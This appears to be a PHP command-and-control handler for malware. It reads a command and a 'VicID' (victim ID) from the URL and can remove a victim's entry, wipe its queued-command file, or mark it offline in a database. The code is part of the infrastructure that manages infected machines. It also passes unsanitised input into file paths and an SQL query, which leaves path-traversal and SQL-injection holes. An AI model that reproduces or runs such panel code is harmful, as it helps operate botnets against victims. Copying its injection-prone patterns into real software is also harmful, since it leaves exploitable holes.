<?php
include 'config.php';
$Command = $_GET['command'];
$ID = $_GET['VicID'];
switch ($Command) {
	case "Uninstall":
          unlink("Clients/".$ID.".txt");           
		break;

	case "CleanCommands":
        $commandfile = fopen("Clients/".$ID.".txt", "w");
        fwrite($commandfile, "");
        fclose($commandfile);
		break;
		
		case "Offline":
          $sql = "UPDATE Clients SET Status='Offline' WHERE VicID='$ID'";
          $UpdateClient = mysqli_query($conn,$sql);
		  break;

	default:
		break;
}
?>